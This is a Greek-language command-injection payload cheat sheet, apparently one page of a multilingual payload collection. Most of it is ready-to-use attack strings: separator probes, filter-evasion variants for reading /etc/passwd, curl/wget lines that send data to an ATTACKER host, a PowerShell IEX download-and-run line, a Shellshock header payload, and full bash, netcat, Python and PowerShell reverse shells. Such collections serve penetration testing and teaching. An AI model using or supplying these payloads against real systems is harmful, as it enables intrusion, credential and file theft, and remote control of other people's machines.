# 💻 Δοκιμαστικές είσοδοι εκτέλεσης εντολών

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../Command-Injection.md) • [🇹🇷 Türkçe Sürüm](Command-Injection.tr.md)

```
 ██████╗ ███████╗     ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ 
██╔═══██╗██╔════╝    ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗
██║   ██║███████╗    ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║
██║   ██║╚════██║    ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║
╚██████╔╝███████║    ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝
 ╚═════╝ ╚══════╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗                   
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║                   
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║                   
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║                   
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║                   
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝                   
```

---

## Πριν ξεκινήσετε

Η **εισαγωγή εντολών λειτουργικού συστήματος (OS Command Injection)** εμφανίζεται όταν δεδομένα χρήστη επηρεάζουν εντολή που εκτελεί η εφαρμογή. Το **shell** είναι ο διερμηνέας εντολών. Διαχωριστικά, εισαγωγικά και μεταβλητές έχουν διαφορετική σημασία σε Bash, cmd.exe και PowerShell.

Τα payloads είναι αποσπάσματα για συγκεκριμένα σημεία εισόδου, όχι πάντα αυτόνομες εντολές τερματικού. Το **blind** σημαίνει ότι εξετάζετε έμμεσο αποτέλεσμα, όπως καθυστέρηση ή ελεγχόμενο callback. Η καθυστέρηση από μόνη της δεν αρκεί για επιβεβαίωση.

<a id="section-01"></a>

## 🎯 Διαχωριστικά εντολών

> **Επιλογή κελύφους:** Η σύνταξη διαχωριστικών δεν είναι κοινή σε cmd.exe, PowerShell και Unix shells. Το ελληνικό ερωτηματικό/semicolon δεν λειτουργεί ως γενικό διαχωριστικό στο cmd.exe. Το ποσοστό 0a χρειάζεται πραγματική αποκωδικοποίηση URL για να γίνει αλλαγή γραμμής.


### Linux/Unix
```bash
;       # Ελληνικό ερωτηματικό ως διαχωριστικό — εκτέλεση στη συνέχεια
|       # Διοχέτευση εξόδου στην επόμενη εντολή
||      # Ή — εκτέλεση αν αποτύχει η πρώτη εντολή
&       # Εκτέλεση στο παρασκήνιο
&&      # ΚΑΙ — εκτέλεση αν επιτύχει η πρώτη εντολή
`cmd`   # Backticks — αντικατάσταση με αποτέλεσμα εντολής
$(cmd)  # Αντικατάσταση με αποτέλεσμα εντολής μέσω δολαρίου
\n      # Αλλαγή γραμμής για διαχωρισμό εντολών
```

### Windows
```cmd
;       # Εξαρτάται από το κέλυφος
|       # Διοχέτευση εξόδου
||      # Ή
&       # Εκτέλεση και των δύο
&&      # ΚΑΙ
\n      # Αλλαγή γραμμής
%0a     # Αλλαγή γραμμής με κωδικοποίηση URL
```

---

<a id="section-02"></a>

## 💉 Βασικά δοκιμαστικά payloads

### Απλή δοκιμή
```bash
; id
; whoami
| id
| whoami
|| id
|| whoami
& id
& whoami
&& id
&& whoami
`id`
$(id)
```

### Με κωδικοποίηση URL
```
%3B+id               # ; id
%7C+id               # | id
%7C%7C+id            # || id
%26+id               # & id
%26%26+id            # && id
%0A+id               # Αλλαγή γραμμής + id
```

---

<a id="section-03"></a>

## 🔥 Τυφλή εισαγωγή εντολών

> **Διαφορετικά κανάλια:** Τα nslookup ελέγχουν DNS· curl/wget κάνουν HTTP και ενδέχεται να προκαλέσουν και επίλυση DNS. Τα αρχικά παραδείγματα αποστολής δεδομένων δεν είναι προϋπόθεση για ελάχιστη επιβεβαίωση εκτέλεσης.


### Ανίχνευση με χρονική καθυστέρηση
```bash
# Εντολές καθυστέρησης
; sleep 5
| sleep 5
|| sleep 5
& sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)

# Windows
; ping -n 5 127.0.0.1
| timeout 5
```

### Ανίχνευση μέσω αλληλεπίδρασης DNS
```bash
# Χρήση nslookup
; nslookup BURP_COLLAB
| nslookup BURP_COLLAB
`nslookup BURP_COLLAB`
$(nslookup BURP_COLLAB)

# Χρήση curl/wget
; curl http://BURP_COLLAB
; wget http://BURP_COLLAB
$(curl http://ATTACKER/?data=$(whoami))
```

### Αποστολή δεδομένων μέσω HTTP
```bash
; curl http://ATTACKER/$(whoami)
; curl http://ATTACKER/?d=$(cat /etc/passwd | base64)
; wget http://ATTACKER/$(hostname)
$(curl http://ATTACKER/?id=$(id))
`curl http://ATTACKER/?user=$(whoami)`
```

---

<a id="section-04"></a>

## 🛡️ Παραλλαγές για διερεύνηση φίλτρων

### Παραλλαγές αντί κενού διαστήματος
```bash
# Χρήση $IFS — εσωτερικού διαχωριστικού πεδίων
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;{cat,/etc/passwd}

# Χρήση tabs
;cat	/etc/passwd

# Χρήση αγκίστρων
{cat,/etc/passwd}
```

### Παραλλαγές λέξεων-κλειδιών
```bash
# Διάσπαση λέξης εντολής
w'h'oami
w"h"oami
who$@ami
who\ami

# Χρήση χαρακτήρων μπαλαντέρ
/bin/ca? /etc/passwd
/bin/c?t /etc/passwd
/b??/c?t /etc/passwd

# Χρήση μεταβλητών
$u; cat /etc/passwd
test=cat; $test /etc/passwd

# Δεκαεξαδική κωδικοποίηση
echo -e "\x69\x64" | sh    # id
```

### Παραλλαγές ειδικών χαρακτήρων
```bash
# Χρήση διαφορετικών διαχωριστικών
;{cat,/etc/passwd}
;cat</etc/passwd
;cat$IFS/etc/passwd

# Εισαγωγή αλλαγής γραμμής
%0aid
%0Acat%20/etc/passwd

# Χρήση σχολίων
; id #
| id #
```

---

<a id="section-05"></a>

## 🐧 Payloads για Linux

### Ανάγνωση αρχείων
```bash
; cat /etc/passwd
; head /etc/passwd
; tail /etc/passwd
; less /etc/passwd
; more /etc/passwd
; nl /etc/passwd
; sort /etc/passwd
; uniq /etc/passwd
; strings /etc/passwd
; od -c /etc/passwd
; xxd /etc/passwd
; base64 /etc/passwd
```

### Εκτέλεση εντολών
```bash
; id
; whoami
; uname -a
; hostname
; pwd
; ls -la
; env
; ps aux
; netstat -an
; ifconfig
; ip addr
```

### Αντίστροφη σύνδεση κελύφους — reverse shell
```bash
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; nc -e /bin/sh ATTACKER 4444
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

---

<a id="section-06"></a>

## 🪟 Payloads για Windows

### Βασικές εντολές
```cmd
& whoami
& hostname
& ipconfig
& net user
& dir
& type C:\Windows\win.ini
& type C:\Windows\System32\drivers\etc\hosts
```

### Ανάγνωση αρχείων
```cmd
& type C:\Windows\win.ini
& type C:\inetpub\wwwroot\web.config
& more C:\Windows\win.ini
& find "password" C:\path\to\file.txt
```

### PowerShell
```powershell
& powershell -c "whoami"
& powershell -c "Get-Process"
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"
```

### Αντίστροφη σύνδεση κελύφους — reverse shell
```cmd
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

<a id="section-07"></a>

## 📝 Συνήθη σημεία εισαγωγής

```
Παράμετροι URL:
  ?ip=127.0.0.1;id
  ?file=test.txt|id
  ?cmd=ls

Παράμετροι POST:
  filename=test.txt;id
  host=localhost|whoami

Κεφαλίδες:
  User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
  X-Forwarded-For: ;id

Ονόματα μεταφορτωμένων αρχείων:
  test;id;.txt
  test$(id).txt
  test`id`.txt
```

---

<a id="section-08"></a>

## 📋 Λίστα ελέγχου

```markdown
□ Δοκιμή διαχωριστικών εντολών (; | || & && ` $())
□ Δοκιμή εκδοχών με κωδικοποίηση URL
□ Έλεγχος τυφλής εισαγωγής με χρονική καθυστέρηση
□ Έλεγχος αλληλεπιδράσεων DNS/HTTP με ελεγχόμενα δεδομένα
□ Δοκιμή παραλλαγών κενού ($IFS, tabs, άγκιστρα)
□ Δοκιμή παραλλαγών λέξεων-κλειδιών με εισαγωγικά και μπαλαντέρ
□ Δοκιμή αλλαγής γραμμής (%0a)
□ Έλεγχος χαρακτήρων που φιλτράρονται
□ Δοκιμή εντολών Linux και Windows ανάλογα με το περιβάλλον
```

---

<a id="section-09"></a>

## 🔗 Σχετικές συλλογές δοκιμαστικών εισόδων

- [Δοκιμαστικές είσοδοι LFI](LFI.el.md)
- [Δοκιμαστικές είσοδοι SSTI](SSTI.el.md)

---

**Επιστροφή στη συλλογή:** [💉 Συλλογή δοκιμαστικών εισόδων στην ελληνική αρχική σελίδα](../../README.el.md)

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
